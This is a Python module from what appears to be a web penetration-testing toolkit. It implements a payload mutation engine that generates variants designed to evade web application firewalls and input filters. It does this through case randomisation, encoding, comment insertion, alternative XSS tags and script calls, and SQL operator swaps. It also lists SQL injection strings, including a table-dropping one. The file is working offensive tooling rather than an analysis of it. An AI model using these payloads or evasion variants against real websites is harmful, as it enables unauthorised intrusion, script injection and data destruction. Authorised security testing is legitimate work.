"""U-FORGE-10 — The Mutation Engine.

Single-pass mutations first, structural replacements second (named
after what they replace), then sort by predicted quality and return
the top-N. The corpus is the spec's MUTATIONS verbatim; case-change is
seeded (MUTATION_SEED = 1337) so output is deterministic. Variants
stay attributed (FORGE-L-3).
"""
from __future__ import annotations

import dataclasses
import hashlib
import random

from webpent.forge.schemas import NormalizedPayload

MUTATION_SEED = 1337


def _case_change(payload: str) -> str:
    rng = random.Random(MUTATION_SEED)
    return "".join(
        c.upper() if rng.random() < 0.5 else c.lower() for c in payload)


def _char_replace(payload: str) -> str:
    return payload.replace("<", "%3C").replace(">", "%3E")


def _whitespace_insert(payload: str) -> str:
    return payload.replace(" ", "  ")


def _comment_insert(payload: str) -> str:
    return payload.replace(" ", "/*x*/")


# Spec corpus, verbatim structure (U-FORGE-10).
MUTATIONS: dict = {
    "case_change": _case_change,
    "char_replace": _char_replace,
    "whitespace_insert": _whitespace_insert,
    "comment_insert": _comment_insert,
    "tag_alternatives": {
        "<script>": ["<svg>", "<img>", "<iframe>", "<body>", "<details>"],
    },
    "alert_alternatives": {
        "alert(1)": ["confirm(1)", "prompt(1)", "eval('alert(1)')"],
    },
    "operator_swap": {
        "=": ["LIKE", "IN", "BETWEEN"],
        "AND": ["&&", "OR NOT", "||"],
    },
    "sql_injection_variants": [
        "' OR '1'='1",
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "'; DROP TABLE users--",
        "' AND 1=2 UNION SELECT 1,2,3--",
    ],
}


def _variant(origin: NormalizedPayload, subfamily: str,
             raw: str, quality: float) -> NormalizedPayload:
    variant_id = hashlib.sha256(
        f"mutation|{subfamily}|{origin.payload_id}|{raw}".encode()
    ).hexdigest()[:16]
    attribution = dataclasses.replace(
        origin.attribution, payload_id=variant_id) \
        if origin.attribution is not None else None
    return NormalizedPayload(
        payload_id=variant_id,
        family=origin.family,
        subfamily=subfamily,
        raw=raw,
        encoded_variants=(),
        target_tech=origin.target_tech,
        target_waf=origin.target_waf,
        target_context=origin.target_context,
        complexity=origin.complexity,
        source="forge-mutation",
        attribution=attribution,
        quality_score=round(quality, 4),
        novelty_score=origin.novelty_score,
        is_polyglot=origin.is_polyglot,
        chains_with=origin.chains_with,
        requires=origin.requires,
    )


def mutate(payload: NormalizedPayload,
           max_variants: int = 20) -> list[NormalizedPayload]:
    """Single-pass mutations, structural replacements, top-N by quality."""
    variants: list[tuple[str, str, float]] = []
    for name in ("case_change", "char_replace", "whitespace_insert",
                 "comment_insert"):
        variants.append((name, MUTATIONS[name](payload.raw), 0.55))
    for old, alternatives in MUTATIONS["tag_alternatives"].items():
        for new in alternatives:
            if old in payload.raw:
                variants.append((
                    f"replace_{old.strip('<>') and old}_with_{new}",
                    payload.raw.replace(old, new), 0.65))
    for old, alternatives in MUTATIONS["alert_alternatives"].items():
        for new in alternatives:
            if old in payload.raw:
                variants.append((
                    f"replace_{old}_with_{new}",
                    payload.raw.replace(old, new), 0.65))
    for old, alternatives in MUTATIONS["operator_swap"].items():
        for new in alternatives:
            if old in payload.raw:
                variants.append((
                    f"operator_{old}_to_{new}",
                    payload.raw.replace(old, new), 0.6))
    variants.sort(key=lambda item: (-item[2], item[0], item[1]))
    top = variants[:max_variants]
    return [_variant(payload, subfamily, raw, quality)
            for subfamily, raw, quality in top]
